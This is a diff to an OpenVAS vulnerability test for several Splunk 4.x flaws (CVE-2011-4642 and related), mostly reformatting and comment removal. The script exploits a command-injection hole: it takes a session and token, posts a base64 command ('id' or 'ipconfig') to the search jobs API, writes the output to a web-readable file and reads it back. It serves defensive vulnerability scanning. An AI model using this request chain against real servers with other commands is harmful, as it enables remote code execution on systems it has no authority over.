@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_splunk_multiple_vuln.nasl 7573 2017-10-26 09:18:50Z cfischer $
+# $Id: secpod_splunk_multiple_vuln.nasl 10285 2018-06-21 12:22:45Z cfischer $
 #
 # Splunk Multiple Vulnerabilities
 #
@@ -27,45 +27,50 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902801");
-  script_version("$Revision: 7573 $");
+  script_version("$Revision: 10285 $");
   script_cve_id("CVE-2011-4642", "CVE-2011-4643", "CVE-2011-4644", "CVE-2011-4778");
   script_bugtraq_id(51061);
   script_tag(name:"cvss_base", value:"9.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-26 11:18:50 +0200 (Thu, 26 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-21 14:22:45 +0200 (Thu, 21 Jun 2018) $");
   script_tag(name:"creation_date", value:"2011-12-22 11:11:11 +0530 (Thu, 22 Dec 2011)");
   script_name("Splunk Multiple Vulnerabilities");
-
-  script_xref(name : "URL" , value : "http://www.sec-1.com/blog/?p=233");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/47232");
-  script_xref(name : "URL" , value : "http://www.splunk.com/view/SP-CAAAGMM");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18245");
-  script_xref(name : "URL" , value : "http://tools.cisco.com/security/center/viewAlert.x?alertId=24805");
-
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 SecPod");
   script_family("Web application abuses");
   script_dependencies("gb_splunk_detect.nasl");
   script_require_ports("Services/www", 8000, 8089);
 
-  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to inject and execute
-  arbitrary code and conduct cross-site scripting and cross-site request
-  forgery attacks.
+  script_xref(name:"URL", value:"http://www.sec-1.com/blog/?p=233");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/47232");
+  script_xref(name:"URL", value:"http://www.splunk.com/view/SP-CAAAGMM");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18245");
+  script_xref(name:"URL", value:"http://tools.cisco.com/security/center/viewAlert.x?alertId=24805");
+
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject and execute
+  arbitrary code and conduct cross-site scripting and cross-site request forgery attacks.
+
   Impact Level: Application/System");
-  script_tag(name : "affected" , value : "Splunk versions 4.0 through 4.2.4");
-  script_tag(name : "insight" , value : "- The application allows users to perform search actions via HTTP requests
+
+  script_tag(name:"affected", value:"Splunk versions 4.0 through 4.2.4");
+
+  script_tag(name:"insight", value:"- The application allows users to perform search actions via HTTP requests
     without performing proper validity checks to verify the requests. This
     can be exploited to execute arbitrary code when a logged-in administrator
     visits a specially crafted web page.
+
   - Certain unspecified input is not properly sanitised before being returned
     to the user. This can be exploited to execute arbitrary HTML and script
     code in a user's browser session in context of an affected site.
+
   - Certain input passed to the web API is not properly sanitised before being
     used to access files. This can be exploited to disclose the content of
     arbitrary files via directory traversal attacks.");
-  script_tag(name : "solution" , value : "Upgrade to Splunk version 4.2.5 or later.
+
+  script_tag(name:"solution", value:"Upgrade to Splunk version 4.2.5 or later.
   For updates refer to http://www.splunk.com/download");
-  script_tag(name : "summary" , value : "This host is running Splunk and is prone to multiple
+
+  script_tag(name:"summary", value:"This host is running Splunk and is prone to multiple
   vulnerabilities.");
 
   script_tag(name:"qod_type", value:"remote_vul");
@@ -74,15 +79,13 @@ if(description)
   exit(0);
 }
 
-
 include("url_func.inc");
 include("http_func.inc");
 include("misc_func.inc");
 include("version_func.inc");
 include("http_keepalive.inc");
 
-## Build Exploit
-function exploit(command , xsplunk, session)
+function exploit(command , xsplunk, session, host)
 {
   url = "/en-GB/api/search/jobs";
 
@@ -112,13 +115,9 @@ function exploit(command , xsplunk, session)
 }
 
 
-## Get HTTP Port
 port = get_http_port(default:8000);
-
-## Get Host Name
 host = http_host_name(port:port);
 
-## Confirm the application
 if(! version = get_kb_item("www/" + port + "/splunk")){
   exit(0);
 }
@@ -129,22 +128,18 @@ if(!get_port_state(dport)){
   exit(0);
 }
 
-## Get Server Info
 req = http_get(item:"/services/server/info/server-info", port:dport);
 server_info = http_keepalive_send_recv(port:dport, data:req);
 
-## Get OS Name
 os = eregmatch(pattern:'name="os_name">(.+)<', string:server_info);
 if(isnull(os[1])) {
   exit(0);
 }
 os = os[1];
 
-## Send and Receive the response
 req = http_get(item:"/en-GB/account/login", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 
-## Get Session ID
 session = eregmatch(pattern:"Set-Cookie: (session[^;]*);", string:res);
 if(isnull(session[1])) {
   exit(0);
@@ -157,32 +152,28 @@ if(isnull(session[1])) {
 }
 xsplunk = xsplunk[1];
 
-## Construct attack request
 if("windows" >< tolower(os))
 {
   tmp = string('>"', "c:\\program files\\splunk\\share\\splunk\\search_",
                "mrsparkle\\exposed\\js\\.tmp",'"');
   command =  urlencode(str:base64(str: string("ipconfig", tmp)));
-  req = exploit(command:command, xsplunk:xsplunk, session:session);
+  req = exploit(command:command, xsplunk:xsplunk, session:session, host:host);
 }
 else
 {
   tmp = ">/opt/splunk/share/splunk/search_mrsparkle/exposed/js/.tmp";
   command =  urlencode(str:base64(str: string("id", tmp)));
-  req = exploit(command:command, xsplunk:xsplunk, session:session);
+  req = exploit(command:command, xsplunk:xsplunk, session:session, host:host);
 }
 
-## Send crafted POST request and receive the response
 res = http_keepalive_send_recv(port:port, data:req);
 
 ## Wait for command execution
 sleep(5);
 
-## Get the result
 req = http_get(item:"/en-US/static/@105575/js/.tmp", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 
-## Confirm exploit worked by checking the response
 if(egrep(pattern:"Subnet Mask|uid=[0-9]+.*gid=[0-9]+", string:res))
 {
   security_message(port:port);
